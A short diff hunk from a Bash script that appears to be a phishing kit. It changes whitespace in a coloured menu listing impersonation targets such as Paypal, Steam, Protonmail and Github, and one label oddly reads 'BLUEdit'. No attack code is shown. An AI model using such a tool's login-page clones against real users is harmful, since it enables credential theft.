@@ -598,7 +598,7 @@ main_menu() {
 		${BLUE}[${WHITE}06${BLUE}]${RED} Paypal        ${BLUE}[${WHITE}16${BLUE}]${RED} Quora        ${BLUE}[${WHITE}26${BLUE}]${RED} Wordpress
 		${BLUE}[${WHITE}07${BLUE}]${RED} Steam         ${BLUE}[${WHITE}17${BLUE}]${RED} Protonmail   ${BLUE}[${WHITE}27${BLUE}]${RED} Yandex			
 		${BLUE}[${WHITE}08${BLUE}]${RED} Twitter       ${BLUE}[${WHITE}18${BLUE}]${RED} Spotify      ${BLUE}[${WHITE}28${BLUE}]${RED} StackoverFlow
-		${BLUE}[${WHITE}09${BLUE}]${RED} Playstation   ${BLUE}[${WHITE}19${BLUE}]${RED} BLUEdit       ${BLUE}[${WHITE}29${BLUE}]${RED} Vk
+		${BLUE}[${WHITE}09${BLUE}]${RED} Playstation   ${BLUE}[${WHITE}19${BLUE}]${RED} BLUEdit      ${BLUE}[${WHITE}29${BLUE}]${RED} Vk
 		${BLUE}[${WHITE}10${BLUE}]${RED} Tiktok        ${BLUE}[${WHITE}20${BLUE}]${RED} Adobe        ${BLUE}[${WHITE}30${BLUE}]${RED} XBOX
 		${BLUE}[${WHITE}31${BLUE}]${RED} Mediafire     ${BLUE}[${WHITE}32${BLUE}]${RED} Gitlab       ${BLUE}[${WHITE}33${BLUE}]${RED} Github
 
